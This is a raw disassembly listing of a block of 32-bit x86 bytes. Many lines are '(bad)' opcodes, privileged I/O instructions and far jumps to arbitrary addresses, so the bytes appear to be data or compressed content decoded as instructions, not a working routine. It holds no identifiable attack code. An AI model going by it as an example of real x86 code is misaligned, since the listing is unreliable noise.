  40d72c:	pop    ebx
  40d72d:	cmp    dh,BYTE PTR [ebx+0x322f6332]
  40d733:	(bad)  [edx]
  40d735:	fidiv  WORD PTR [edx]
  40d737:	cmp    DWORD PTR [eax+0x2aa20564],esi
  40d73d:	inc    edx
  40d73e:	sahf   
  40d73f:	mov    dh,0x2c
  40d741:	aaa    
  40d742:	gs gs popa 
  40d745:	out    0xdd,al
  40d747:	icebp  
  40d748:	daa    
  40d749:	dec    esi
  40d74a:	addr16 loop 0x40d6f8
  40d74d:	jne    0x40d79d
  40d74f:	xor    DWORD PTR [ebp-0x5a3237ec],edx
  40d755:	jmp    0x40d767
  40d757:	js     0x40d7b7
  40d759:	js     0x40d7ab
  40d75b:	sub    BYTE PTR [esi-0x717d821f],dl
  40d761:	mov    esp,0x41491711
  40d766:	push   edx
  40d767:	sub    al,0xd2
  40d769:	sub    BYTE PTR [esi-0x17f75931],0x21
  40d770:	push   0x48
  40d772:	repz into 
  40d774:	icebp  
  40d775:	and    ebp,DWORD PTR [eax+0xf82448e]
  40d77b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d77c:	or     ch,bh
  40d77e:	mov    al,0x48
  40d780:	xchg   ebx,eax
  40d781:	(bad)  
  40d782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d783:	sbb    ah,bl
  40d785:	dec    eax
  40d786:	loop   0x40d776
  40d788:	imul   DWORD PTR [ebx]
  40d78a:	sub    eax,0x46ce8df
  40d78f:	fsub   st(7),st
  40d791:	jmp    0x9f282b16
  40d796:	es or  al,0x7b
  40d799:	sbb    al,0xa9
  40d79c:	popa   
  40d79d:	pop    eax
  40d79e:	mov    bh,0x7f
  40d7a0:	push   edi
  40d7a1:	adc    eax,0xdf9f834a
  40d7a6:	mov    eax,0xda6bd7d1
  40d7ab:	imul   eax,ebp,0x1945d3a0
  40d7b1:	popf   
  40d7b2:	cwde   
  40d7b3:	pop    ecx
  40d7b4:	pusha  
  40d7b5:	add    esp,DWORD PTR [edx-0x318b3a77]
  40d7bb:	dec    ebp
  40d7bc:	pop    edi
  40d7bd:	mov    ebx,0xdfe75479
  40d7c2:	xchg   BYTE PTR [edi-0x3b],bl
  40d7c5:	inc    edx
  40d7c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7c7:	scas   al,BYTE PTR es:[edi]
  40d7c8:	cmp    DWORD PTR [ebp+ebx*4+0x4d],esi
  40d7cc:	mov    ebp,0xf0507100
  40d7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d2:	xor    ah,ah
  40d7d4:	add    DWORD PTR [ebx+0x5060a735],eax
  40d7da:	push   ebp
  40d7db:	pop    edx
  40d7dc:	sbb    ah,bh
  40d7de:	mov    BYTE PTR [edx+0x3c2e1ce9],ch
  40d7e4:	or     DWORD PTR [edx-0x1436ecc4],ebp
  40d7ea:	xlat   BYTE PTR ds:[ebx]
  40d7eb:	xchg   esi,eax
  40d7ec:	in     eax,0xdc
  40d7ee:	xor    eax,0x408c97ee
  40d7f3:	pop    eax
  40d7f4:	jo     0x40d7d1
  40d7f6:	or     eax,0xabb6a4aa
  40d7fb:	add    ecx,edx
  40d7fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7fe:	push   edi
  40d7ff:	pop    es
  40d800:	pop    ebp
  40d801:	jae    0x40d7b9
  40d803:	jge    0x40d86a
  40d805:	scas   eax,DWORD PTR es:[edi]
  40d806:	es add eax,0xab06f45f
  40d80c:	or     ah,cl
  40d80e:	push   es
  40d80f:	fwait
  40d810:	push   ebx
  40d811:	popa   
  40d812:	mov    eax,ds:0x636807d8
  40d817:	mov    ds:0x4479686c,eax
  40d81c:	mov    dh,0xd2
  40d81e:	pop    ebx
  40d81f:	js     0x40d82f
  40d821:	div    DWORD PTR [ecx+0x7e]
  40d824:	ret    
  40d825:	enter  0x8cdb,0x5e
  40d829:	push   esi
  40d82a:	and    BYTE PTR [ebp-0x3b847bc],cl
  40d830:	stos   BYTE PTR es:[edi],al
  40d831:	out    0x95,al
  40d833:	(bad)  
  40d834:	sub    ah,cl
  40d836:	mov    DWORD PTR [edx-0x36],ebx
  40d839:	sar    BYTE PTR [esi-0x69fff8a5],0x74
  40d840:	jg     0x40d80a
  40d842:	outs   dx,BYTE PTR ds:[esi]
  40d843:	inc    ebx
  40d844:	jg     0x40d862
  40d846:	div    eax
  40d848:	sbb    WORD PTR [eax],cx
  40d84b:	loop   0x40d870
  40d84d:	repnz mov dl,0xec
  40d850:	jge    0x40d847
  40d852:	test   eax,0xe5fcc02
  40d857:	jge    0x40d89d
  40d859:	(bad)  
  40d85a:	outs   dx,DWORD PTR ds:[esi]
  40d85b:	je     0x40d863
  40d85d:	test   BYTE PTR [ebp+0x3e],cl
  40d860:	inc    esp
  40d861:	xchg   esp,eax
  40d862:	sbb    al,0x14
  40d864:	jno    0x40d872
  40d866:	adc    eax,0xae38585b
  40d86b:	push   ds
  40d86c:	jp     0x40d819
  40d86e:	or     esp,0xfffffff7
  40d871:	hlt    
  40d872:	ret    
  40d873:	bnd jp 0x40d8a7
  40d876:	loop   0x40d8d5
  40d878:	mov    ecx,0x3672ae79
  40d87d:	mov    edi,0xb0799329
  40d882:	(bad)  
  40d883:	adc    BYTE PTR [edx],ah
  40d885:	rcr    DWORD PTR [ebp-0x8],cl
  40d888:	mov    ecx,0xf9cf3e88
  40d88d:	and    al,0x40
  40d88f:	arpl   di,dx
  40d891:	jae    0x40d82e
  40d893:	fstp   TBYTE PTR [esi+esi*4+0x6bb81a49]
  40d89a:	pop    edx
  40d89b:	inc    edx
  40d89c:	jae    0x40d8dc
  40d89e:	sub    dh,dl
  40d8a0:	nop
  40d8a1:	jbe    0x40d91f
  40d8a3:	xchg   edi,eax
  40d8a4:	pop    ecx
  40d8a5:	es xchg ebp,eax
  40d8a7:	cmc    
  40d8a8:	in     eax,dx
  40d8a9:	sbb    bl,BYTE PTR [esp+esi*2-0x6e33305]
  40d8b0:	rcr    BYTE PTR [ebx+0x56],cl
  40d8b3:	xchg   esi,eax
  40d8b4:	pop    edx
  40d8b5:	popf   
  40d8b6:	add    BYTE PTR [eax-0x7f558881],cl
  40d8bc:	xlat   BYTE PTR ds:[ebx]
  40d8bd:	lahf   
  40d8be:	xor    al,0xcd
  40d8c0:	sar    BYTE PTR [eax+0x38487c5a],0x6b
  40d8c7:	or     ebx,DWORD PTR [edx+0x217f0da7]
  40d8cd:	push   eax
  40d8ce:	inc    ebx
  40d8cf:	sub    ah,bh
  40d8d1:	das    
  40d8d2:	dec    edi
  40d8d3:	cld    
  40d8d4:	pusha  
  40d8d5:	imul   ecx,DWORD PTR [edx-0x7b],0x9
  40d8d9:	jb     0x40d925
  40d8db:	out    dx,eax
  40d8dc:	leave  
  40d8dd:	int3   
  40d8de:	(bad)  
  40d8df:	xchg   ebx,eax
  40d8e0:	jge    0x40d901
  40d8e2:	pop    ds
  40d8e3:	push   eax
  40d8e4:	jg     0x40d93b
  40d8e6:	and    DWORD PTR [ebx+0x3b],edi
  40d8e9:	loope  0x40d873
  40d8eb:	mov    eax,0x7e437af7
  40d8f0:	lods   al,BYTE PTR ds:[esi]
  40d8f1:	bound  ebx,QWORD PTR [ebp-0x24a5a21a]
  40d8f7:	inc    ebx
  40d8f8:	mov    cl,0x55
  40d8fa:	adc    DWORD PTR [ebx+0x37b1a3b8],ecx
  40d900:	push   edx
  40d901:	mov    edi,0xe194eae8
  40d906:	js     0x40d92b
  40d908:	push   edx
  40d909:	loop   0x40d8e5
  40d90b:	clc    
  40d90c:	sbb    esp,DWORD PTR [edx-0x24]
  40d90f:	sbb    edi,esp
  40d911:	cmp    eax,0xd36c5a17
  40d916:	adc    eax,0x8cf819f8
  40d91b:	and    esi,DWORD PTR [ebp-0x7356401f]
  40d921:	jo     0x40d96c
  40d923:	dec    edx
  40d924:	(bad)  
  40d925:	xchg   ebx,eax
  40d926:	int    0xd2
  40d928:	imul   eax,DWORD PTR [ebx-0x7f5d1d47],0x704f798f
  40d932:	mov    al,0xfb
  40d934:	pop    ebp
  40d935:	add    ebx,DWORD PTR [eax-0x4bbdb1f6]
  40d93b:	mov    ch,0x79
  40d93d:	push   ebx
  40d93e:	leavew 
  40d940:	or     ecx,DWORD PTR [edi]
  40d942:	int    0x4
  40d944:	jmp    0x9710:0x2e3c200
  40d94b:	sbb    BYTE PTR ds:[edi+ebp*2],cl
  40d94f:	xchg   edi,edi
  40d951:	ret    
  40d952:	xor    eax,0x8ac1ee95
  40d957:	and    BYTE PTR [ebp-0x1c],cl
  40d95a:	mov    cs,ebx
  40d95c:	imul   esp,DWORD PTR [eax+0x7a],0x784583e6
  40d963:	shr    BYTE PTR [eax-0x17],0xfa
  40d967:	retf   0xe3bd
  40d96a:	in     al,0x8f
  40d96c:	mov    edi,0x400a379f
  40d971:	ins    DWORD PTR es:[edi],dx
  40d972:	in     eax,0x97
  40d974:	mov    BYTE PTR [eax-0x5dacc5f5],ah
  40d97a:	cmp    edi,DWORD PTR [eax-0x4]
  40d97d:	mov    eax,ds:0x14d0c2ba
  40d982:	fcom   DWORD PTR [ecx]
  40d984:	add    ebp,0x6d
  40d987:	xor    al,0x3d
  40d989:	adc    al,0x65
  40d98b:	pop    ss
  40d98c:	popa   
  40d98d:	and    al,BYTE PTR [ecx+0x40]
  40d990:	cs repz mov ch,0xdf
  40d994:	inc    edi
  40d995:	lock arpl WORD PTR [ebx-0x19],di
  40d999:	lea    eax,[ecx+eiz*4]
  40d99c:	jle    0x40d93c
  40d99e:	mov    ebp,?
  40d9a0:	daa    
  40d9a1:	push   ebx
  40d9a2:	add    DWORD PTR [ebx+0xb1f2293],ecx
  40d9a8:	mov    dl,0xc6
  40d9aa:	outs   dx,DWORD PTR ds:[esi]
  40d9ab:	sbb    eax,0x48bad04e
  40d9b0:	sti    
  40d9b1:	and    eax,0x5968a645
  40d9b6:	(bad)  
  40d9b7:	xor    eax,DWORD PTR [edi-0x35]
  40d9ba:	sub    al,0xd9
  40d9bc:	sbb    eax,0x4846727d
  40d9c1:	outs   dx,BYTE PTR ds:[esi]
  40d9c2:	jmp    0x2078:0x1e56f3df
  40d9c9:	or     eax,DWORD PTR [eax+0x69fcf2f0]
  40d9cf:	pop    edi
  40d9d0:	xor    BYTE PTR [ebp+0x72],dh
  40d9d3:	mov    edx,0xaabfaaed
  40d9d8:	xchg   DWORD PTR [edi-0x32],ecx
  40d9db:	adc    BYTE PTR [edx-0x2f],ch
  40d9de:	retf   0xc149
  40d9e1:	adc    ebp,DWORD PTR [esi]
  40d9e3:	xor    eax,0xab25c86d
  40d9e8:	stos   BYTE PTR es:[edi],al
  40d9e9:	mov    bh,0x83
  40d9eb:	icebp  
  40d9ec:	(bad)  
  40d9ed:	pop    esp
  40d9ee:	ins    DWORD PTR es:[edi],dx
  40d9ef:	jl     0x40d97c
  40d9f1:	adc    al,0xf3
  40d9f3:	pop    ebp
  40d9f4:	jg     0x40da0d
  40d9f6:	mov    ?,WORD PTR [esi-0x3cd037fe]
  40d9fc:	(bad)  
  40d9fd:	popf   
  40d9fe:	mov    esp,0xa415ea1e
  40da03:	push   es
  40da04:	cwde   
  40da05:	dec    ebx
  40da06:	sbb    edx,ecx
  40da08:	popf   
  40da09:	jns    0x40d98b
  40da0b:	mov    cs,esi
  40da0d:	xchg   edi,eax
  40da0e:	mov    dh,dl
  40da10:	xchg   ecx,eax
  40da11:	(bad)  
  40da12:	ds xchg ecx,eax
  40da14:	jb     0x40d9ff
  40da16:	in     al,0xbe
  40da18:	in     eax,dx
  40da19:	mov    ch,0xf7
  40da1b:	mov    esi,0xdad0eed5
  40da20:	xchg   DWORD PTR [eax+eiz*1-0x223e95f4],esp
  40da27:	mov    ebp,0xfc22b5b4
  40da2c:	xchg   ebp,eax
  40da2d:	add    edi,DWORD PTR [edi]
  40da2f:	(bad)  
  40da30:	fcom   QWORD PTR [ecx]
  40da32:	pop    edi
  40da33:	out    0x9a,al
  40da35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da36:	jo     0x40da3a
  40da38:	shl    BYTE PTR [edi-0x32da7678],1
  40da3e:	rol    DWORD PTR [ecx],0x89
  40da41:	std    
  40da42:	and    al,0x12
  40da44:	push   ebp
  40da45:	or     DWORD PTR [ecx+0x28],edx
  40da48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da49:	inc    esi
  40da4a:	xor    DWORD PTR [ebx+0x210d7cc1],ebp
  40da50:	mov    eax,0x25c981e6
  40da55:	test   edx,edx
  40da57:	aam    0x93
  40da59:	jg     0x40da18
  40da5b:	mov    edi,0x7d5207f1
  40da60:	add    edi,edi
  40da62:	and    ch,BYTE PTR [ecx+0x26c55b60]
  40da68:	sub    BYTE PTR [ebx],0xda
  40da6b:	rcr    BYTE PTR [ebp-0x54a287d6],0x86
  40da72:	sub    dh,BYTE PTR [ecx+0x2f64206]
  40da78:	sbb    DWORD PTR [edi-0x576b87be],0x2a7b2504
  40da82:	fsub   QWORD PTR [esp+ecx*4+0x33]
  40da86:	jecxz  0x40dac6
  40da88:	inc    edx
  40da89:	loope  0x40dafb
  40da8b:	imul   ecx,ebx,0x976120d3
  40da91:	fwait
  40da92:	popf   
  40da93:	push   es
  40da94:	jae    0x40dae4
  40da96:	int3   
  40da97:	into   
  40da98:	fisttp DWORD PTR [eax+0x47]
  40da9b:	xor    BYTE PTR [ebp-0x61],ah
  40da9e:	and    al,0x7d
  40daa0:	and    al,0xf6
  40daa2:	sub    ecx,DWORD PTR [edi*2-0x54ca520b]
  40daa9:	lahf   
  40daaa:	pop    ss
  40daab:	ja     0x40da7f
  40daad:	dec    esp
  40daae:	push   edi
  40daaf:	aam    0xd7
  40dab1:	inc    ebx
  40dab2:	cld    
  40dab3:	cmp    BYTE PTR ds:0x3d4f8e3b,bl
  40dab9:	cmc    
  40daba:	jo     0x40db0e
  40dabc:	inc    esi
  40dabd:	push   ebx
  40dabe:	stos   DWORD PTR es:[edi],eax
  40dabf:	popa   
  40dac0:	shr    DWORD PTR [edi+0x29],0x5
  40dac4:	mov    bh,0x37
  40dac6:	(bad)  
  40dac8:	mov    esi,0xc083ea70
  40dacd:	ins    BYTE PTR es:[edi],dx
  40dace:	pusha  
  40dacf:	lea    edi,[ebp-0x2c]
  40dad2:	dec    ebx
  40dad3:	push   edi
  40dad4:	cwde   
  40dad5:	ja     0x40da9c
  40dad7:	ja     0x40da8d
  40dad9:	sar    bh,cl
  40dadb:	or     al,ah
  40dadd:	mov    dh,0x6b
  40dadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae0:	(bad)  
  40dae1:	xchg   ebx,eax
  40dae2:	pusha  
  40dae3:	mov    eax,0x1e03037a
  40dae8:	out    0xdb,al
  40daea:	add    al,0x6c
  40daec:	xor    DWORD PTR [edx-0x52dfbc83],esi
  40daf2:	sub    BYTE PTR [ecx],0x11
  40daf5:	dec    ebp
  40daf6:	fs xchg ecx,eax
  40daf8:	pop    es
  40daf9:	(bad)  
  40dafa:	fpatan 
  40dafc:	pop    ebp
  40dafd:	(bad)  
  40daff:	aam    0xce
  40db01:	push   edi
  40db02:	das    
  40db03:	adc    eax,0xee3ff225
  40db08:	mov    eax,0x35d78f5a
  40db0d:	jge    0x40daab
  40db0f:	cs cmp DWORD PTR cs:[esi+0x4a],esi
  40db14:	inc    esp
  40db15:	xor    esp,eax
  40db17:	out    dx,eax
  40db18:	(bad)  
  40db19:	data16 adc al,0xf5
  40db1c:	(bad)  
  40db1d:	mov    eax,0xe37c1e4b
  40db22:	cmp    cl,ah
  40db24:	add    ebp,DWORD PTR [ebx]
  40db26:	sub    ebx,DWORD PTR [esi]
  40db28:	sti    
  40db29:	aad    0xe6
  40db2b:	in     eax,0x63
  40db2d:	mov    dl,0x60
  40db2f:	jl     0x40dace
  40db31:	cli    
  40db32:	fyl2x  
  40db34:	adc    DWORD PTR [esp+ebp*4],edx
  40db37:	add    dh,BYTE PTR [edx+0x7a]
  40db3a:	mov    ah,0xf8
  40db3c:	push   cs
  40db3d:	dec    ecx
  40db3e:	std    
  40db3f:	or     edi,eax
  40db41:	sub    DWORD PTR [eax-0x5024e286],0x9
  40db48:	cmc    
  40db49:	in     eax,dx
  40db4a:	arpl   WORD PTR [ebp-0x35ea8505],dx
  40db50:	xchg   BYTE PTR [ecx+0x7afc069c],al
  40db56:	pop    ss
  40db57:	sti    
  40db58:	push   eax
  40db59:	adc    eax,0x55f034ce
  40db5e:	pop    eax
  40db5f:	repnz xchg edx,eax
  40db61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db62:	push   cs
  40db63:	sahf   
  40db64:	cs ret 0xecd4
  40db68:	cs adc al,0xe0
  40db6b:	imul   esi,DWORD PTR [ebx+0x5e],0xffffffa0
  40db6f:	dec    ebp
  40db70:	outs   dx,BYTE PTR ds:[esi]
  40db71:	cmp    BYTE PTR [esi+0x75],0x7a
  40db75:	mov    bh,0xd7
  40db77:	mov    eax,0xa4336719
  40db7c:	mov    esi,0x85eb5059
  40db81:	inc    ecx
  40db82:	mul    BYTE PTR [ebx-0x9]
  40db85:	pop    esp
  40db86:	dec    esp
  40db87:	(bad)  
  40db88:	imul   ebx,DWORD PTR [edx-0x49],0xffffffc3
  40db8c:	mov    ds:0xcace5ee1,al
  40db91:	hlt    
  40db92:	xor    edi,ecx
  40db94:	ret    0x2381
  40db97:	cmp    ecx,DWORD PTR [eax]
  40db99:	popa   
  40db9a:	dec    edi
  40db9b:	jmp    0xe550:0xc8e1e2f5
  40dba2:	call   0xd92a:0x95108750
  40dba9:	pop    ss
  40dbaa:	and    eax,DWORD PTR [esi-0x1d]
  40dbad:	push   ds
  40dbae:	cld    
  40dbaf:	dec    BYTE PTR [ebx+ebx*8]
  40dbb2:	sbb    bl,BYTE PTR [eax-0x3e]
  40dbb5:	jae    0x40db80
  40dbb7:	push   ds
  40dbb8:	jg     0x40db9e
  40dbba:	out    0xa1,eax
  40dbbc:	ret    
  40dbbd:	out    dx,eax
  40dbbe:	mov    ds:0x540d41c2,eax
  40dbc3:	push   ss
  40dbc4:	frstor [edx-0x47b61049]
  40dbca:	mov    edx,0x5bc8d181
  40dbcf:	pop    edi
  40dbd0:	xchg   esp,eax
  40dbd1:	sbb    BYTE PTR [edx-0x36],0x45
  40dbd5:	mov    ?,edi
  40dbd7:	popa   
  40dbd8:	mov    WORD PTR [esi-0x4a1ba46c],fs
  40dbde:	ret    0x2731
  40dbe1:	xchg   edx,eax
  40dbe2:	push   ecx
  40dbe3:	sbb    al,BYTE PTR [edx-0x3441453]
  40dbe9:	mov    ah,0x62
  40dbeb:	sub    BYTE PTR [ecx+esi*2],bh
  40dbee:	push   0x9ef281a
  40dbf3:	fndisi(8087 only) 
  40dbf5:	jo     0x40dbc5
  40dbf7:	cmp    DWORD PTR [edx-0x625dfef0],ecx
  40dbfd:	jns    0x40dbf5
  40dbff:	cmp    al,BYTE PTR [esi+ebp*1-0x67]
  40dc03:	aad    0x3e
  40dc05:	push   ebp
  40dc06:	mov    edi,0x5f528bd
  40dc0b:	add    cl,BYTE PTR [ebx]
  40dc0d:	and    eax,0x523a8dba
  40dc12:	jae    0x40dbb2
  40dc14:	sub    eax,0xa7e78a9b
  40dc19:	inc    ebp
  40dc1a:	mov    esi,DWORD PTR [edx+0x6f]
  40dc1d:	push   0x1be08c47
  40dc22:	cmp    ebp,DWORD PTR [ebx]
  40dc24:	aad    0xbe
  40dc26:	inc    ebp
  40dc27:	pop    esi
  40dc28:	dec    esp
  40dc29:	fnsave [eax+0x2b]
  40dc2c:	or     eax,0xa9f753ca
  40dc31:	xor    ch,ch
  40dc33:	loope  0x40dc46
  40dc35:	lahf   
  40dc36:	in     al,dx
  40dc37:	push   edi
  40dc38:	test   DWORD PTR [eax],ecx
  40dc3a:	or     eax,0xd082dc71
  40dc3f:	mov    esi,0x5fc6b82c
  40dc44:	inc    ecx
  40dc45:	gs inc ebx
  40dc47:	mov    cl,0xec
  40dc49:	mov    al,ds:0x9b6bd1b9
  40dc4e:	lods   eax,DWORD PTR ds:[esi]
  40dc4f:	push   esi
  40dc50:	into   
  40dc51:	aas    
  40dc52:	enter  0x50e5,0xc7
  40dc56:	sar    esp,1
  40dc58:	stos   BYTE PTR es:[edi],al
  40dc59:	pusha  
  40dc5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc5c:	fild   QWORD PTR [ebp-0x67]
  40dc5f:	adc    eax,0x29a35349
  40dc64:	outs   dx,DWORD PTR ds:[esi]
  40dc65:	push   esi
  40dc66:	rcl    BYTE PTR [edi-0x1dfcd272],cl
  40dc6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc6d:	mov    eax,ds:0x7bea1933
  40dc72:	jo     0x40dcaf
  40dc74:	retf   0xa32c
  40dc77:	sti    
  40dc78:	pop    edi
  40dc79:	dec    ebx
  40dc7a:	sbb    BYTE PTR [ecx+edi*8+0x4e],0x98
  40dc7f:	jg     0x40dc8a
  40dc81:	push   edi
  40dc82:	or     dl,dl
  40dc84:	cmp    BYTE PTR [esp+esi*1+0x14],bl
  40dc88:	in     eax,0x4a
  40dc8a:	cmc    
  40dc8b:	xchg   ebx,eax
  40dc8c:	dec    ebx
  40dc8d:	mov    ebp,0x5dc00c16
  40dc92:	in     al,0x6e
  40dc94:	inc    ebx
  40dc95:	or     BYTE PTR [esi+edx*1],al
  40dc98:	into   
  40dc99:	sub    BYTE PTR [ebp-0x50],ah
  40dc9c:	add    DWORD PTR [ecx+ebp*1-0x5a],ebx
  40dca0:	mov    al,ds:0x6ed008c9
  40dca5:	(bad)  
  40dca6:	out    dx,eax
  40dca7:	idiv   BYTE PTR cs:[edx]
  40dcaa:	clc    
  40dcab:	mov    al,ds:0x7f135dc5
  40dcb0:	jp     0x40dc70
  40dcb2:	les    eax,FWORD PTR [edi-0x72]
  40dcb5:	jne    0x40dccc
  40dcb7:	sbb    al,0x7c
  40dcb9:	mov    edi,0xb81653a1
  40dcbe:	xchg   bl,bl
  40dcc0:	xchg   esi,eax
  40dcc1:	frstor [ecx-0x3f]
  40dcc4:	add    DWORD PTR [edx+0x305587e9],edx
  40dcca:	sbb    DWORD PTR [ebx+0x12cd35bc],esp
  40dcd0:	mov    edx,0x3c5e591b
  40dcd5:	mov    bl,0xe7
  40dcd7:	push   ds
  40dcd8:	pushf  
  40dcd9:	mov    ecx,0x3b8887b3
  40dcde:	and    eax,0x65d08b92
  40dce3:	sbb    al,0xa1
  40dce5:	dec    esp
  40dce6:	xlat   BYTE PTR ds:[ebx]
  40dce7:	mov    ecx,0x3f47d2a1
  40dcec:	mov    ds:0x373e3537,al
  40dcf1:	or     DWORD PTR [ebx],edx
  40dcf3:	inc    ebp
  40dcf4:	inc    ecx
  40dcf5:	and    BYTE PTR [edx+0x47],dl
  40dcf8:	pop    edi
  40dcf9:	jl     0x40dcac
  40dcfb:	fiadd  WORD PTR [ecx]
  40dcfd:	outs   dx,DWORD PTR ds:[esi]
  40dcfe:	mov    ebx,0x3022efe0
  40dd03:	pop    ss
  40dd04:	xor    al,0xed
  40dd06:	mov    al,0x80
  40dd08:	es xchg esi,eax
  40dd0a:	loopne 0x40dca5
  40dd0c:	jecxz  0x40dcd0
  40dd0e:	shl    DWORD PTR [edx+0x3e],cl
  40dd11:	(bad)  
  40dd12:	mov    ebx,0x453b24
  40dd17:	loop   0x40dd85
  40dd19:	pushf  
  40dd1a:	fs push ss
  40dd1c:	push   ds
  40dd1d:	retf   0x2f62
  40dd20:	ins    DWORD PTR es:[edi],dx
  40dd21:	push   ebx
  40dd22:	pop    ebx
  40dd23:	push   ebx
  40dd24:	int    0xaf
  40dd26:	(bad)  
  40dd27:	aad    0xf0
  40dd29:	pop    edi
  40dd2a:	pop    esp
  40dd2b:	imul   edx,DWORD PTR [esi],0x46
  40dd2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd2f:	push   edx
  40dd30:	int    0xe2
  40dd32:	stos   DWORD PTR es:[edi],eax
  40dd33:	fstp   st(0)
  40dd35:	dec    esp
  40dd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd37:	mov    DWORD PTR fs:[eax+0x218c967f],edx
  40dd3e:	pop    ss
  40dd3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd40:	inc    esi
  40dd41:	lock jb 0x40dd8a
  40dd44:	push   ds
  40dd45:	xchg   esi,eax
  40dd46:	std    
  40dd47:	(bad)  
  40dd48:	dec    esi
  40dd49:	into   
  40dd4a:	cmp    ecx,DWORD PTR ds:0xa95ca4c6
  40dd50:	mov    ah,0x9d
  40dd52:	hlt    
  40dd53:	das    
  40dd54:	xor    ebx,0xab2111b7
  40dd5a:	jns    0x40dd82
  40dd5c:	stos   DWORD PTR es:[edi],eax
  40dd5d:	jae    0x40dcf3
  40dd5f:	ins    DWORD PTR es:[edi],dx
  40dd60:	sbb    eax,0xf45e8157
  40dd65:	sbb    esp,DWORD PTR [esi+0x30e2d3a1]
  40dd6b:	(bad)  
  40dd6c:	ror    ebx,cl
  40dd6e:	sahf   
  40dd6f:	mov    ebp,DWORD PTR [edx+0x4b0f8b05]
  40dd75:	les    edx,FWORD PTR ds:0x8b4aa209
  40dd7b:	and    al,0x0
  40dd7d:	repz jmp 0x4be98290
  40dd83:	ins    BYTE PTR es:[edi],dx
  40dd84:	inc    edx
  40dd85:	imul   eax,edx,0x1b37951f
  40dd8b:	or     BYTE PTR [edi-0x3bce090a],bl
  40dd91:	cmp    cl,BYTE PTR ss:[esi]
  40dd94:	shr    BYTE PTR [edx],1
  40dd96:	sbb    eax,0x863c7c80
  40dd9b:	enter  0x5429,0x78
  40dd9f:	or     BYTE PTR [edi-0x5af89688],0x46
  40dda6:	in     al,0xd9
  40dda8:	int    0xfb
  40ddaa:	scas   eax,DWORD PTR es:[edi]
  40ddab:	adc    BYTE PTR [edx+0x2a],dl
  40ddae:	test   al,al
  40ddb0:	mov    ds,WORD PTR [ebx+edx*4+0x6a2865da]
  40ddb7:	arpl   cx,bp
  40ddb9:	sub    al,0x2a
  40ddbb:	xor    ch,BYTE PTR [edx+esi*2-0x6aabb19d]
  40ddc2:	pop    esp
  40ddc3:	mov    ecx,0x1374c452
  40ddc8:	(bad)  
  40ddc9:	out    dx,al
  40ddca:	loope  0x40ddc1
  40ddcc:	or     eax,0xee05c74d
  40ddd1:	add    eax,0xf5c95abe
  40ddd6:	lods   al,BYTE PTR ds:[esi]
  40ddd7:	pop    esi
  40ddd8:	test   al,0xbc
  40ddda:	dec    ebp
  40dddb:	stos   DWORD PTR es:[edi],eax
  40dddc:	pop    esp
  40dddd:	sbb    al,0xb1
  40dddf:	mov    ecx,0x53743dd0
  40dde5:	imul   ecx,DWORD PTR [edx-0x4],0x4e
  40dde9:	ss jge 0x40dd9a
  40ddec:	mov    ds:0x348d8363,al
  40ddf1:	test   DWORD PTR [ecx+0x7611ef44],ebx
  40ddf7:	int3   
  40ddf8:	outs   dx,BYTE PTR ds:[esi]
  40ddf9:	dec    edx
  40ddfa:	mov    edi,0x53d61973
  40de00:	adc    dh,dl
  40de02:	mov    eax,0x60ab2d4a
  40de07:	js     0x40de15
  40de09:	test   al,0x56
  40de0b:	adc    BYTE PTR [ecx],cl
  40de0d:	add    eax,0xab2f12da
  40de12:	(bad)  
  40de13:	dec    ebx
  40de14:	xchg   esp,eax
  40de15:	call   DWORD PTR [ecx]
  40de17:	out    0x6f,eax
  40de19:	push   esi
  40de1a:	scas   al,BYTE PTR es:[edi]
  40de1b:	loopne 0x40dda6
  40de1d:	add    esi,ebx
  40de1f:	in     eax,0xce
  40de21:	jge    0x40de8a
  40de23:	ss js  0x40de3a
  40de26:	mov    esp,esi
  40de28:	mov    esp,0x23f26e9b
  40de2d:	loope  0x40de96
  40de2f:	(bad)  
  40de30:	mov    dh,0x20
  40de32:	ret    0xae16
  40de35:	ret    0x7566
  40de38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de3a:	arpl   WORD PTR [eax+0x1f],bp
  40de3d:	lock cmp DWORD PTR [ebx+edx*2+0x70],0xf8ccdc37
  40de46:	sub    BYTE PTR [eax],dl
  40de48:	mov    dl,0x1d
  40de4a:	hlt    
  40de4b:	push   eax
  40de4c:	(bad)  
  40de4d:	adc    ch,dl
  40de4f:	cmp    eax,0x6aaa1249
  40de54:	outs   dx,DWORD PTR ds:[esi]
  40de55:	xchg   edx,eax
  40de56:	pop    edi
  40de57:	repz imul edx,DWORD PTR [edx+0x59],0x2b
  40de5c:	jmp    0x8a55:0x7beb6598
  40de63:	xchg   ebp,eax
  40de64:	pop    ds
  40de65:	mov    al,ds:0xc66012d7
  40de6a:	or     bh,BYTE PTR [edx+0x23]
  40de6d:	jge    0x40dec6
  40de6f:	std    
  40de70:	mov    cl,0x30
  40de72:	xchg   ecx,eax
  40de73:	pop    ss
  40de74:	inc    esp
  40de75:	jmp    0xb0ba0ffc
  40de7a:	ja     0x40de96
  40de7c:	inc    eax
  40de7d:	add    dl,ch
  40de7f:	xchg   edx,eax
  40de80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de81:	aam    0x9d
  40de83:	out    dx,eax
  40de84:	das    
  40de85:	jp     0x40de55
  40de87:	lds    ebp,FWORD PTR [edx-0x3]
  40de8a:	nop
  40de8b:	scas   eax,DWORD PTR es:[edi]
  40de8c:	mov    cl,0x4f
  40de8e:	stos   BYTE PTR es:[di],al
